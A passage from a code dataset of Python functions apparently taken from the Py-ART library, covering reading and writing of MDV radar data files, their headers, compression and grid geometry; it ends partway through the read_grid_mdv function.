ARM-DOE/pyart,read_a_field,"def read_a_field(self, fnum, debug=False):
    """"""
        Read a field from the MDV file.

        Parameters
        ----------
        fnum : int
            Field number to read.
        debug : bool
            True to print debugging information, False to supress.

        Returns
        -------
        field_data : array
            Field data.  This data is also stored as a object attribute under
            the field name.

        See Also
        --------
        read_all_fields : Read all fields in the MDV file.

        """"""
    field_header = self.field_headers[fnum]
    if self.fields_data[fnum] is not None:
        if debug:
            print('Getting data from the object.')
        return self.fields_data[fnum]
    if debug:
        print('No data found in object, populating')
    nz = field_header['nz']
    ny = field_header['ny']
    nx = field_header['nx']
    field_data = np.zeros([nz, ny, nx], dtype='float32')
    self.fileptr.seek(field_header['field_data_offset'])
    self._get_levels_info(nz)
    for sw in range(nz):
        if debug:
            print('doing levels ', sw)
        compr_info = self._get_compression_info()
        if compr_info['magic_cookie'] == 4261479421:
            self.fileptr.seek(-4, 1)
            compr_data = self.fileptr.read(compr_info['spare'][0])
        else:
            compr_data = self.fileptr.read(compr_info['nbytes_coded'])
        encoding_type = field_header['encoding_type']
        if encoding_type == ENCODING_INT8:
            fmt = '>%iB' % (nx * ny)
            np_form = '>B'
        elif encoding_type == ENCODING_INT16:
            fmt = '>%iH' % (nx * ny)
            np_form = '>H'
        elif encoding_type == ENCODING_FLOAT32:
            fmt = '>%if' % (nx * ny)
            np_form = '>f'
        else:
            raise NotImplementedError('encoding: ', encoding_type)
        if compr_info['magic_cookie'] == GZIP_COMPRESSED:
            cd_fobj = BytesIO(compr_data)
            gzip_file_handle = gzip.GzipFile(fileobj=cd_fobj)
            decompr_data = gzip_file_handle.read(struct.calcsize(fmt))
            gzip_file_handle.close()
        elif compr_info['magic_cookie'] == ZLIB_COMPRESSED:
            decompr_data = zlib.decompress(compr_data)
        elif compr_info['magic_cookie'] == BZIP_COMPRESSED:
            decompr_data = bz2.decompress(compr_data)
        elif compr_info['magic_cookie'] == TA_NOT_COMPRESSED:
            decompr_data = compr_data
        elif compr_info['magic_cookie'] == GZIP_NOT_COMPRESSED:
            decompr_data = compr_data
        elif compr_info['magic_cookie'] == ZLIB_NOT_COMPRESSED:
            decompr_data = compr_data
        elif compr_info['magic_cookie'] == BZIP_NOT_COMPRESSED:
            decompr_data = compr_data
        elif compr_info['magic_cookie'] == RL8_COMPRESSION:
            key = compr_info['nbytes_uncompressed']
            decompr_size = compr_info['nbytes_coded']
            decompr_data = _decode_rle8(compr_data, key, decompr_size)
        else:
            raise NotImplementedError('unknown compression mode')
        sw_data = np.frombuffer(decompr_data, np_form).astype('float32')
        sw_data.shape = (ny, nx)
        mask = sw_data == field_header['bad_data_value']
        np.putmask(sw_data, mask, [np.NaN])
        scale = field_header['scale']
        bias = field_header['bias']
        field_data[sw, :, :] = sw_data * scale + bias
    self.fields_data[fnum] = field_data
    return field_data"
ARM-DOE/pyart,read_all_fields,"def read_all_fields(self):
    """"""Read all fields, storing data to field name attributes.""""""
    for i in range(self.master_header['nfields']):
        self.read_a_field(i)"
ARM-DOE/pyart,close,"def close(self):
    """"""Close the MDV file.""""""
    self.fileptr.close()"
ARM-DOE/pyart,_write_a_field,"def _write_a_field(self, fnum):
    """"""write field number 'fnum' to mdv file.""""""
    field_header = self.field_headers[fnum]
    if field_header['compression_type'] != 3:
        import warnings
        warnings.warn('compression_type not implemented, converting to zlib')
        field_header['compression_type'] = 3
    field_data = self.fields_data[fnum]
    nz = field_header['nz']
    field_start = self.fileptr.tell()
    self.fileptr.write(b'\x00' * 4 * 2 * nz)
    field_size = 0
    vlevel_offsets = [0] * nz
    vlevel_nbytes = [0] * nz
    for sw in range(nz):
        vlevel_offsets[sw] = field_size
        scale = field_header['scale']
        bias = field_header['bias']
        sw_data = (field_data[sw, :, :] - bias) / scale
        if hasattr(sw_data, 'mask'):
            sw_data = np.where(sw_data.mask, field_header['bad_data_value'], sw_data)
        encoding_type = field_header['encoding_type']
        if encoding_type == ENCODING_INT8:
            sw_data = np.round(sw_data).astype(np.uint8)
            np_form = '>B'
        elif encoding_type == ENCODING_INT16:
            sw_data = np.round(sw_data).astype(np.uint16)
            np_form = '>H'
        elif encoding_type == ENCODING_FLOAT32:
            sw_data = sw_data.astype(np.float32)
            np_form = '>f'
        else:
            raise NotImplementedError('encoding: ', encoding_type)
        uncompr_data = np.array(sw_data, dtype=np_form).tostring()
        compr_data = zlib.compress(uncompr_data)
        if len(compr_data) > len(uncompr_data):
            magic = 4143380214
            compr_data = uncompr_data
        else:
            magic = 4126537205
        compr_info = {'magic_cookie': magic, 'nbytes_uncompressed': len(uncompr_data), 'nbytes_compressed': len(compr_data) + 24, 'nbytes_coded': len(compr_data), 'spare': [0, 0]}
        self._write_compression_info(compr_info)
        self.fileptr.write(compr_data)
        field_size = field_size + len(compr_data) + 24
        vlevel_nbytes[sw] = len(compr_data) + 24
    field_end = self.fileptr.tell()
    self.fileptr.seek(field_start)
    vlevels_dic = {'vlevel_offsets': vlevel_offsets, 'vlevel_nbytes': vlevel_nbytes}
    self._write_levels_info(nz, vlevels_dic)
    self.fileptr.seek(field_end)
    field_header['volume_size'] = field_size + 2 * 4 * nz"
ARM-DOE/pyart,_unpack_mapped_tuple,"def _unpack_mapped_tuple(self, packet, mapper):
    """"""Create a dictionary from a tuple using a mapper.""""""
    d = {}
    for item in mapper:
        if item[2] == item[1] + 1:
            d[item[0]] = packet[item[1]]
        else:
            d[item[0]] = packet[item[1]:item[2]]
        if isinstance(d[item[0]], bytes):
            d[item[0]] = d[item[0]].decode('ascii').split('\x00', 1)[0]
    return d"
ARM-DOE/pyart,_pack_mapped,"def _pack_mapped(self, d, mapper, fmt):
    """"""Create a packed string using a mapper and format.""""""
    packet = [0] * mapper[-1][2]
    for item in mapper:
        if item[2] == item[1] + 1:
            packet[item[1]] = d[item[0]]
            if hasattr(packet[item[1]], 'encode'):
                packet[item[1]] = packet[item[1]].encode('ascii')
        else:
            packet[item[1]:item[2]] = d[item[0]]
    fmt = str(fmt)
    return struct.pack(fmt, *packet)"
ARM-DOE/pyart,_get_master_header,"def _get_master_header(self):
    """"""Read the MDV master header, return a dict.""""""
    if self.fileptr is None:
        packet = [0] * self.master_header_mapper[-1][2]
        packet[0] = 1016
        packet[1] = 14142
        packet[2] = 1
        packet[9] = 1
        packet[16] = 1
        packet[17] = 1
        packet[63] = ''
        packet[64] = ''
        packet[65] = ''
        packet[66] = 1016
    else:
        packet = struct.unpack(self.master_header_fmt, self.fileptr.read(struct.calcsize(self.master_header_fmt)))
    return self._unpack_mapped_tuple(packet, self.master_header_mapper)"
ARM-DOE/pyart,_write_master_header,"def _write_master_header(self):
    """"""Write the MDV master header.""""""
    d = self.master_header
    packet = [0] * self.master_header_mapper[-1][2]
    for item in self.master_header_mapper:
        if item[2] == item[1] + 1:
            packet[item[1]] = d[item[0]]
            if hasattr(packet[item[1]], 'encode'):
                packet[item[1]] = packet[item[1]].encode('ascii')
        else:
            packet[item[1]:item[2]] = d[item[0]]
    string = struct.pack(self.master_header_fmt, *packet)
    self.fileptr.write(string)"
ARM-DOE/pyart,_get_field_headers,"def _get_field_headers(self, nfields):
    """"""Read nfields field headers, return a list of dicts.""""""
    return [self._get_field_header() for i in range(nfields)]"
ARM-DOE/pyart,_write_field_headers,"def _write_field_headers(self, nfields):
    """"""Write nfields field headers.""""""
    for i in range(nfields):
        self._write_field_header(self.field_headers[i])"
ARM-DOE/pyart,_get_field_header,"def _get_field_header(self):
    """"""Read a single field header, return a dict.""""""
    if self.fileptr is None:
        packet = [0] * self.field_header_mapper[-1][2]
        packet[0] = 408
        packet[1] = 14143
        packet[57] = 1
        packet[71] = ''
        packet[72] = ''
        packet[73] = ''
        packet[74] = ''
        packet[75] = ''
        packet[76] = 408
    else:
        packet = struct.unpack(self.field_header_fmt, self.fileptr.read(struct.calcsize(self.field_header_fmt)))
    return self._unpack_mapped_tuple(packet, self.field_header_mapper)"
ARM-DOE/pyart,_write_field_header,"def _write_field_header(self, d):
    """"""Write the a single field header.""""""
    string = self._pack_mapped(d, self.field_header_mapper, self.field_header_fmt)
    self.fileptr.write(string)"
ARM-DOE/pyart,_get_vlevel_headers,"def _get_vlevel_headers(self, nfields):
    """"""Read nfields vlevel headers, return a list of dicts.""""""
    return [self._get_vlevel_header() for i in range(nfields)]"
ARM-DOE/pyart,_write_vlevel_headers,"def _write_vlevel_headers(self, nfields):
    """"""Write nfields vlevel headers.""""""
    for i in range(nfields):
        self._write_vlevel_header(self.vlevel_headers[i])"
ARM-DOE/pyart,_get_vlevel_header,"def _get_vlevel_header(self):
    """"""Read a single vlevel header, return a dict.""""""
    if self.fileptr is None:
        packet = [0] * self.vlevel_header_mapper[-1][2]
        packet[0] = 1016
        packet[1] = 14144
        packet[255] = 1016
    else:
        packet = struct.unpack(self.vlevel_header_fmt, self.fileptr.read(struct.calcsize(self.vlevel_header_fmt)))
    return self._unpack_mapped_tuple(packet, self.vlevel_header_mapper)"
ARM-DOE/pyart,_write_vlevel_header,"def _write_vlevel_header(self, d):
    """"""Write the a single vfield header.""""""
    string = self._pack_mapped(d, self.vlevel_header_mapper, self.vlevel_header_fmt)
    self.fileptr.write(string)"
ARM-DOE/pyart,_get_chunk_headers,"def _get_chunk_headers(self, nchunks):
    """"""Get nchunk chunk headers, return a list of dicts.""""""
    return [self._get_chunk_header() for i in range(nchunks)]"
ARM-DOE/pyart,_write_chunk_headers,"def _write_chunk_headers(self, nchunks):
    """"""Write nchunk chunk headers.""""""
    for i in range(nchunks):
        self._write_chunk_header(self.chunk_headers[i])"
ARM-DOE/pyart,_get_chunk_header,"def _get_chunk_header(self):
    """"""Get a single chunk header, return a dict.""""""
    if self.fileptr is None:
        packet = [0] * self.chunk_header_mapper[-1][2]
        packet[0] = 504
        packet[1] = 14145
        packet[7] = ''
        packet[8] = 504
    else:
        packet = struct.unpack(self.chunk_header_fmt, self.fileptr.read(struct.calcsize(self.chunk_header_fmt)))
    return self._unpack_mapped_tuple(packet, self.chunk_header_mapper)"
ARM-DOE/pyart,_write_chunk_header,"def _write_chunk_header(self, d):
    """"""Write the a single chunk header.""""""
    string = self._pack_mapped(d, self.chunk_header_mapper, self.chunk_header_fmt)
    self.fileptr.write(string)"
ARM-DOE/pyart,_get_chunks,"def _get_chunks(self, debug=False):
    """"""Get data in chunks, return radar_info, elevations, calib_info.""""""
    (radar_info, elevations, calib_info) = (None, [], None)
    for (cnum, curr_chunk_header) in enumerate(self.chunk_headers):
        chunk_id = curr_chunk_header['chunk_id']
        self.fileptr.seek(curr_chunk_header['chunk_data_offset'])
        if chunk_id == CHUNK_DSRADAR_PARAMS:
            if debug:
                print('Getting radar info')
            radar_info = self._get_radar_info()
        elif chunk_id == CHUNK_DSRADAR_ELEVATIONS:
            if debug:
                print('getting elevations')
            elevations = self._get_elevs(curr_chunk_header['size'])
        elif chunk_id == CHUNK_DSRADAR_CALIB:
            if debug:
                print('getting cal')
            calib_info = self._get_calib()
        else:
            if debug:
                print('getting unknown chunk %i' % chunk_id)
            self.chunk_data[cnum] = self._get_unknown_chunk(cnum)
    return (radar_info, elevations, calib_info)"
ARM-DOE/pyart,_write_chunks,"def _write_chunks(self, debug=False):
    """"""write chunks data""""""
    for (cnum, curr_chunk_header) in enumerate(self.chunk_headers):
        chunk_id = curr_chunk_header['chunk_id']
        if chunk_id == CHUNK_DSRADAR_PARAMS:
            if debug:
                print('writing radar info')
            self._write_radar_info(self.radar_info)
        elif chunk_id == CHUNK_DSRADAR_ELEVATIONS:
            if debug:
                print('writing elevations')
            self._write_elevs(self.elevations)
        elif chunk_id == CHUNK_DSRADAR_CALIB:
            if debug:
                print('writing cal')
            self._write_calib(self.calib_info)
        else:
            if debug:
                print('writing unknown chunk %i' % chunk_id)
            self._write_unknown_chunk(self.chunk_data[cnum])"
ARM-DOE/pyart,_get_radar_info,"def _get_radar_info(self):
    """"""Get the radar information, return dict.""""""
    if self.fileptr is None:
        packet = [0] * self.radar_info_mapper[-1][2]
        packet[40] = ''
        packet[41] = ''
    else:
        packet = struct.unpack(self.radar_info_fmt, self.fileptr.read(struct.calcsize(self.radar_info_fmt)))
    return self._unpack_mapped_tuple(packet, self.radar_info_mapper)"
ARM-DOE/pyart,_write_radar_info,"def _write_radar_info(self, d):
    """"""Write radar information.""""""
    string = self._pack_mapped(d, self.radar_info_mapper, self.radar_info_fmt)
    self.fileptr.write(string)"
ARM-DOE/pyart,_get_elevs,"def _get_elevs(self, nbytes):
    """"""Return an array of elevation read from current file position.""""""
    SIZE_FLOAT = 4.0
    nelevations = np.floor(nbytes / SIZE_FLOAT)
    fmt = '>%df' % nelevations
    packet = struct.unpack(fmt, self.fileptr.read(struct.calcsize(fmt)))
    return np.array(packet)"
ARM-DOE/pyart,_write_elevs,"def _write_elevs(self, packet):
    """"""Write an array of elevation.""""""
    fmt = '>%df' % len(packet)
    fmt = str(fmt)
    string = struct.pack(fmt, *packet)
    self.fileptr.write(string)"
ARM-DOE/pyart,_get_calib,"def _get_calib(self):
    """"""Get the calibration information, return a dict.""""""
    if self.fileptr is None:
        packet = [0] * self.calib_mapper[-1][2]
        packet[0] = ''
    else:
        packet = struct.unpack(self.calib_fmt, self.fileptr.read(struct.calcsize(self.calib_fmt)))
    return self._unpack_mapped_tuple(packet, self.calib_mapper)"
ARM-DOE/pyart,_write_calib,"def _write_calib(self, d):
    """"""Write calibration information.""""""
    string = self._pack_mapped(d, self.calib_mapper, self.calib_fmt)
    self.fileptr.write(string)"
ARM-DOE/pyart,_get_compression_info,"def _get_compression_info(self):
    """"""Get compression infomation, return a dict.""""""
    if self.fileptr is None:
        packet = [0] * self.compression_info_mapper[-1][2]
    else:
        packet = struct.unpack(self.compression_info_fmt, self.fileptr.read(struct.calcsize(self.compression_info_fmt)))
    return self._unpack_mapped_tuple(packet, self.compression_info_mapper)"
ARM-DOE/pyart,_write_compression_info,"def _write_compression_info(self, d):
    """"""Write compression infomation.""""""
    string = self._pack_mapped(d, self.compression_info_mapper, self.compression_info_fmt)
    self.fileptr.write(string)"
ARM-DOE/pyart,_get_unknown_chunk,"def _get_unknown_chunk(self, cnum):
    """"""Get raw data from chunk.""""""
    size = self.chunk_headers[cnum]['size']
    return self.fileptr.read(size)"
ARM-DOE/pyart,_write_unknown_chunk,"def _write_unknown_chunk(self, data):
    """"""Write raw data from chunk.""""""
    self.fileptr.write(data)"
ARM-DOE/pyart,_get_levels_info,"def _get_levels_info(self, nlevels):
    """"""Get nlevel information, return a dict.""""""
    fmt = '>%iI %iI' % (nlevels, nlevels)
    if self.fileptr:
        packet = struct.unpack(fmt, self.fileptr.read(struct.calcsize(fmt)))
    else:
        packet = [0] * 2 * nlevels
    d = {}
    d['vlevel_offsets'] = packet[:nlevels]
    d['vlevel_nbytes'] = packet[nlevels:2 * nlevels]
    return d"
ARM-DOE/pyart,_write_levels_info,"def _write_levels_info(self, nlevels, d):
    """"""write levels information, return a dict.""""""
    fmt = '%iI %iI' % (nlevels, nlevels)
    packet = d['vlevel_offsets'] + d['vlevel_nbytes']
    fmt = str(fmt)
    string = struct.pack(fmt, *packet)
    self.fileptr.write(string)"
ARM-DOE/pyart,_calc_file_offsets,"def _calc_file_offsets(self):
    """"""Calculate file offsets.""""""
    self.master_header['field_hdr_offset'] = 1024
    self.master_header['vlevel_hdr_offset'] = 1024 + 416 * self.master_header['nfields']
    self.master_header['chunk_hdr_offset'] = 1024 + (416 + 1024) * self.master_header['nfields']
    file_pos = self.master_header['chunk_hdr_offset'] + 512 * self.master_header['nchunks']
    for i in range(self.master_header['nfields']):
        self.field_headers[i]['field_data_offset'] = file_pos
        file_pos = file_pos + self.field_headers[i]['volume_size']
    for i in range(self.master_header['nchunks']):
        self.chunk_headers[i]['chunk_data_offset'] = file_pos
        file_pos = file_pos + self.chunk_headers[i]['size']"
ARM-DOE/pyart,_make_time_dict,"def _make_time_dict(self):
    """"""Return a time dictionary.""""""
    t_base = datetime.datetime(1970, 1, 1, 0, 0)
    tb = datetime.timedelta(seconds=self.master_header['time_begin'])
    te = datetime.timedelta(seconds=self.master_header['time_end'])
    tc = datetime.timedelta(seconds=self.master_header['time_centroid'])
    return {'time_begin': t_base + tb, 'time_end': t_base + te, 'time_centroid': t_base + tc}"
ARM-DOE/pyart,_time_dict_into_header,"def _time_dict_into_header(self):
    """"""Complete time information in master_header from the time dict.""""""
    self.master_header['time_begin'] = self._secs_since_epoch(self.times['time_begin'])
    self.master_header['time_end'] = self._secs_since_epoch(self.times['time_end'])
    self.master_header['time_centroid'] = self._secs_since_epoch(self.times['time_centroid'])"
ARM-DOE/pyart,_secs_since_epoch,"def _secs_since_epoch(self, dt):
    """"""Return the number of seconds since the epoch for a datetime.""""""
    epoch = datetime.datetime(1970, 1, 1, 0, 0)
    td = dt - epoch
    return int((td.microseconds + (td.seconds + td.days * 24 * 3600) * 10 ** 6) / 10 ** 6)"
ARM-DOE/pyart,_calc_geometry,"def _calc_geometry(self):
    """"""Calculate geometry, return az_deg, range_km, el_deg.""""""
    nsweeps = self.master_header['max_nz']
    nrays = self.master_header['max_ny']
    ngates = self.master_header['max_nx']
    grid_minx = self.field_headers[0]['grid_minx']
    grid_miny = self.field_headers[0]['grid_miny']
    grid_dx = self.field_headers[0]['grid_dx']
    grid_dy = self.field_headers[0]['grid_dy']
    range_km = grid_minx + np.arange(ngates) * grid_dx
    if self.field_headers[0]['proj_type'] == PROJ_RHI_RADAR:
        el_deg = grid_miny + np.arange(nrays) * grid_dy
        az_deg = self.vlevel_headers[0]['level'][0:nsweeps]
    elif self.field_headers[0]['proj_type'] == PROJ_POLAR_RADAR:
        az_deg = grid_miny + np.arange(nrays) * grid_dy
        el_deg = self.vlevel_headers[0]['level'][0:nsweeps]
    else:
        proj_type = self.field_headers[0]['proj_type']
        message = 'Unsupported projection type: %i, ' % proj_type + 'is MDV file in antenna coordinates?'
        raise NotImplementedError(message)
    return (az_deg, range_km, el_deg)"
ARM-DOE/pyart,_make_carts_dict,"def _make_carts_dict(self):
    """"""Return a carts dictionary, distances in meters.""""""
    (az_deg, range_km, el_deg) = self._calc_geometry()
    nsweeps = self.master_header['max_nz']
    nrays = self.master_header['max_ny']
    ngates = self.master_header['max_nx']
    xx = np.empty([nsweeps, nrays, ngates], dtype=np.float32)
    yy = np.empty([nsweeps, nrays, ngates], dtype=np.float32)
    zz = np.empty([nsweeps, nrays, ngates], dtype=np.float32)
    if self.projection == 'rhi':
        (rg, ele) = np.meshgrid(range_km, el_deg)
        rg = np.array(rg, dtype=np.float64)
        ele = np.array(ele, dtype=np.float64)
        for aznum in range(nsweeps):
            azg = np.ones(rg.shape, dtype=np.float64) * az_deg[aznum]
            (x, y, z) = antenna_to_cartesian(rg, azg, ele)
            zz[aznum, :, :] = z
            xx[aznum, :, :] = x
            yy[aznum, :, :] = y
    elif self.projection == 'ppi':
        (rg, azg) = np.meshgrid(range_km, az_deg)
        rg = np.array(rg, dtype=np.float64)
        azg = np.array(azg, dtype=np.float64)
        for elnum in range(nsweeps):
            ele = np.ones(rg.shape, dtype=np.float64) * el_deg[elnum]
            (x, y, z) = antenna_to_cartesian(rg, azg, ele)
            zz[elnum, :, :] = z
            xx[elnum, :, :] = x
            yy[elnum, :, :] = y
    return {'x': xx, 'y': yy, 'z': zz}"
ARM-DOE/pyart,_make_fields_list,"def _make_fields_list(self):
    """"""Return a list of fields.""""""
    fh = self.field_headers
    return [fh[i]['field_name'] for i in range(len(fh))]"
ARM-DOE/pyart,__init__,"def __init__(self, mdvfile, field_num, fillvalue, two_dims=True):
    """"""initialize the object.""""""
    self.mdvfile = mdvfile
    self.field_num = field_num
    self.fillvalue = fillvalue
    self.two_dims = two_dims"
ARM-DOE/pyart,__call__,"def __call__(self):
    """"""Return an array containing data from the referenced volume.""""""
    data = self.mdvfile.read_a_field(self.field_num)
    data[np.where(np.isnan(data))] = self.fillvalue
    data[np.where(data == 131072)] = self.fillvalue
    data = np.ma.masked_equal(data, self.fillvalue)
    if self.two_dims:
        data.shape = (data.shape[0] * data.shape[1], data.shape[2])
    return data"
ARM-DOE/pyart,write_grid_mdv,"def write_grid_mdv(filename, grid, mdv_field_names=None, field_write_order=None):
    """"""
    Write grid object to MDV file.

    Create a MDV file containing data from the provided grid instance.

    The MDV file will contain parameters from the 'source' key if contained
    in grid.metadata. If this key or parameters related to the radar location
    and name are not present in the grid a default or sentinel value.
    will be written in the MDV file in the place of the parameter.

    Grid fields will be saved in float32 unless the `_Write_as_dtype` key is
    present.

    Parameters
    ----------
    filename : str or file-like object.
        Filename of MDV file to create. If a file-like object is specified
        data will be written using the write method.
    grid : Grid
        Grid object from which to create MDV file.
    mdv_field_names : dict or None, optional
        Mapping between grid fields and MDV data type names. Field names
        mapped to None or with no mapping will be excluded from
        writing. If None, the same field names will be used.
    field_write_order : list or None, optional
        Order in which grid fields should be written out in the MDV file.
        None, the default, will determine a valid order automatically.

    Notes
    -----
    Do to limitations of the MDV format, not all grid objects are writable.
    To write a grid the following conditions must be satisfied:

        * XY grid must be regular (equal spacing), Z can be irregular.
        * The number of Z levels must not exceed 122.
        * Fields can be encoded in the file using the '_Write_as_dtype' key
          specifying one of 'uint8', 'uint16' or 'float32'. Use the
          'scale_factor' and 'add_offset' keys to specify scaling. Field
          data in the Grid object should be uncompressed, that is to say
          it has had the scaling applied.

    """"""
    if field_write_order is None:
        field_write_order = list(grid.fields.keys())
    if mdv_field_names is not None:
        for (ifield, field) in enumerate(field_write_order):
            if field not in mdv_field_names or mdv_field_names[field] is None:
                field_write_order.pop(ifield)
    grid_shape = grid.fields[field_write_order[0]]['data'].shape
    (nz, ny, nx) = grid_shape
    nfields = len(field_write_order)
    if nz > mdv_common.MDV_MAX_VLEVELS:
        warnings.warn(('%i vlevels exceed MDV_MAX_VLEVELS = %i. Extra ' + 'levels will be ignored') % (nz, mdv_common.MDV_MAX_VLEVELS))
        nz = mdv_common.MDV_MAX_VLEVELS
    mdv = mdv_common.MdvFile(None)
    mdv.field_headers = mdv._get_field_headers(nfields)
    mdv.vlevel_headers = mdv._get_vlevel_headers(nfields)
    mdv.fields_data = [None] * nfields
    mdv.projection = 'flat'
    d = mdv.master_header
    grid_datetime = _time_dic_to_datetime(grid.time)
    mdv.times['time_centroid'] = grid_datetime
    mdv.times['time_begin'] = grid_datetime
    mdv.times['time_end'] = grid_datetime
    mdv._time_dict_into_header()
    d['data_dimension'] = 3
    d['data_collection_type'] = 3
    if grid.z['units'] == 'm' or grid.z['units'] == 'meters':
        d['native_vlevel_type'] = 4
    elif grid.z['units'] == 'Â' or grid.z['units'] == 'degree':
        d['native_vlevel_type'] = 9
    d['vlevel_type'] = d['native_vlevel_type']
    d['nfields'] = nfields
    d['max_nx'] = nx
    d['max_ny'] = ny
    d['max_nz'] = nz
    td = datetime.datetime.utcnow() - datetime.datetime(1970, 1, 1, 0, 0)
    d['time_written'] = int(round(td.microseconds + (td.seconds + td.days * 24 * 3600) * 10 ** 6) / 10 ** 6)
    if grid.radar_longitude is not None and grid.nradar != 0:
        d['sensor_lon'] = grid.radar_longitude['data'][0]
    else:
        d['sensor_lon'] = grid.origin_longitude['data'][0]
    if grid.radar_latitude is not None and grid.nradar != 0:
        d['sensor_lat'] = grid.radar_latitude['data'][0]
    else:
        d['sensor_lat'] = grid.origin_latitude['data'][0]
    if grid.radar_altitude is not None and grid.nradar != 0:
        d['sensor_alt'] = grid.radar_altitude['data'][0] / 1000.0
    else:
        d['sensor_alt'] = grid.origin_altitude['data'][0] / 1000.0
    for (meta_key, mdv_key) in mdv_common.MDV_METADATA_MAP.items():
        if meta_key in grid.metadata:
            d[mdv_key] = grid.metadata[meta_key].encode('ASCII')
    for (ifield, field) in enumerate(field_write_order):
        d = mdv.field_headers[ifield]
        v = mdv.vlevel_headers[ifield]
        d['nx'] = nx
        d['ny'] = ny
        d['nz'] = nz
        d['proj_type'] = mdv_common.PROJ_FLAT
        try:
            dtype = np.dtype(grid.fields[field]['_Write_as_dtype'])
        except KeyError:
            dtype = np.float32
        if dtype == np.uint8:
            d['encoding_type'] = mdv_common.ENCODING_INT8
            d['data_element_nbytes'] = 1
        elif dtype == np.uint16:
            d['encoding_type'] = mdv_common.ENCODING_INT16
            d['data_element_nbytes'] = 2
        elif dtype == np.float32 or dtype == np.float64:
            d['encoding_type'] = mdv_common.ENCODING_FLOAT32
            d['data_element_nbytes'] = 4
        else:
            raise TypeError(""Unsuported encoding %s, encoding must be uint8, uint16 or float32 as specfied by the '_Write_as_dtype key"" % dtype)
        d['compression_type'] = 3
        d['scaling_type'] = 4
        d['native_vlevel_type'] = mdv.master_header['vlevel_type']
        d['vlevel_type'] = mdv.master_header['vlevel_type']
        d['data_dimension'] = 3
        d['proj_origin_lat'] = grid.origin_latitude['data'][0]
        d['proj_origin_lon'] = grid.origin_longitude['data'][0]
        d['grid_dx'] = (grid.x['data'][1] - grid.x['data'][0]) / 1000.0
        d['grid_dy'] = (grid.y['data'][1] - grid.y['data'][0]) / 1000.0
        d['grid_minx'] = grid.x['data'][0] / 1000.0
        d['grid_miny'] = grid.y['data'][0] / 1000.0
        if 'scale_factor' in grid.fields[field].keys():
            d['scale'] = grid.fields[field]['scale_factor']
        if 'add_offset' in grid.fields[field].keys():
            d['bias'] = grid.fields[field]['add_offset']
        if '_FillValue' in grid.fields[field].keys():
            d['bad_data_value'] = grid.fields[field]['_FillValue']
        elif 'missing_value' in grid.fields[field].keys():
            d['bad_data_value'] = grid.fields[field]['missing_value']
        else:
            d['bad_data_value'] = get_fillvalue()
        if 'missing_value' in grid.fields[field].keys():
            d['missing_data_value'] = grid.fields[field]['missing_value']
        elif '_FillValue' in grid.fields[field].keys():
            d['missing_data_value'] = grid.fields[field]['_FillValue']
        else:
            d['missing_data_value'] = get_fillvalue()
        d['min_value'] = np.amax(grid.fields[field]['data'])
        d['max_value'] = np.amin(grid.fields[field]['data'])
        if 'standard_name' in grid.fields[field].keys():
            d['field_name_long'] = grid.fields[field]['standard_name'].encode('ASCII')
        elif 'long_name' in grid.fields[field].keys():
            d['field_name_long'] = grid.fields[field]['long_name'].encode('ASCII')
        if mdv_field_names is not None:
            d['field_name'] = mdv_field_names[field].encode('ASCII')
        else:
            d['field_name'] = field.encode('ASCII')
        if 'units' in grid.fields[field].keys():
            d['units'] = grid.fields[field]['units'].encode('ASCII')
        d['transform'] = b'none'
        typ = [0] * 122
        level = [0] * 122
        for iz in range(nz):
            typ[iz] = d['vlevel_type']
            level[iz] = grid.z['data'][iz] / 1000.0
        v['type'] = typ
        v['level'] = level
        mdv.fields_data[ifield] = grid.fields[field]['data']
    mdv.write(filename)"
ARM-DOE/pyart,read_grid_mdv,"def read_grid_mdv(filename, field_names=None, additional_metadata=None, file_field_names=False, exclude_fields=None, delay_field_loading=False, **kwargs):
    """"""
    Read a MDV file to a Grid Object.

    Parameters
    ----------
    filename : str
        Name of MDV file to read or file-like object pointing to the
        beginning of such a file.
    field_names : dict, optional
        Dictionary mapping MDV data type names to radar field names. If a
        data type found in the file does not appear in this dictionary or has
        a value of None it will not be placed in the radar.fields dictionary.
        A value of None, the default, will use the mapping defined in the
        Py-ART configuration file.
    additional_metadata : dict of dicts, optional
        Dictionary of dictionaries to retrieve metadata from during this read.
        This metadata is not used during any successive file reads unless
        explicitly included. A value of None, the default, will not
        introduct any addition metadata and the file specific or default
        metadata as specified by the Py-ART configuration file will be used.
    file_field_names : bool, optional
        True to use the MDV data type names for the field names. If this
        case the field_names parameter is ignored. The field dictionary will
        likely only have a 'data' key, unless the fields are defined in
        `additional_metadata`.
    exclude_fields : list or None, optional
        List of fields to exclude from the grid object. This is applied
        after the `file_field_names` and `field_names` parameters.
    delay_field_loading : bool
        True to delay loading of field data from the file until the 'data'
        key in a particular field dictionary is accessed. In this case
        the field attribute of the returned Radar object will contain
        LazyLoadDict objects not dict objects.

    Returns
    -------
    grid : Grid
        Grid object containing data from MDV file.

    Notes
    -----
    This function can only read cartesian MDV files with fields
    compressed with gzip or zlib. For polar files see
    :py:func:`pyart.io.read_mdv`

    MDV files and Grid object are not fully interchangeable. Specific
    limitation include:

        * All fields must have the same shape and dimensions.
        * All fields must have the same projection.
        * Vlevels types must not vary.
        * Projection must not be PROJ_POLAR_RADAR (9) or PROJ_RHI_RADAR (13).
        * Correct unit in the Z axis are just availible for 'vlevel_type'
          equal to VERT_TYPE_Z(4), VERT_TYPE_ELEV(9), VERT_TYPE_AZ(17),
          VERT_TYPE_PRESSURE(3) and VERT_TYPE_THETA(7).
        * The behavior in cases of 2D data is unknown but most likely will not
          fail.

    """"""
    _test_arguments(kwargs)
    filemetadata = FileMetadata('mdv', field_names, additional_metadata, file_field_names, exclude_fields)
    mdv = mdv_common.MdvFile(prepare_for_read(filename))
    units = make_time_unit_str(mdv.times['time_begin'])
    time = get_metadata('grid_time')
    time['data'] = np.array([date2num(mdv.times['time_centroid'], units)])
    time['units'] = units
    origin_altitude = get_metadata('origin_altitude')
    origin_altitude['data'] = np.array([mdv.master_header['sensor_alt'] * 1000.0], dtype='float64')
    origin_latitude = get_metadata('origin_latitude')
    origin_latitude['data'] = np.array([mdv.master_header['sensor_lat']], dtype='float64')
    origin_longitude = get_metadata('origin_longitude')
    origin_longitude['data'] = np.array([mdv.master_header['sensor_lon']], dtype='float64')
    nz = mdv.master_header['max_nz']
    ny = mdv.master_header['max_ny']
    nx = mdv.master_header['max_nx']
    z_line = mdv.vlevel_headers[0]['level'][0:nz]
    y_start = mdv.field_headers[0]['grid_miny'] * 1000.0
    x_start = mdv.field_headers[0]['grid_minx'] * 1000.0
    y_step = mdv.field_headers[0]['grid_dy'] * 1000.0
    x_step = mdv.field_headers[0]['grid_dx'] * 1000.0
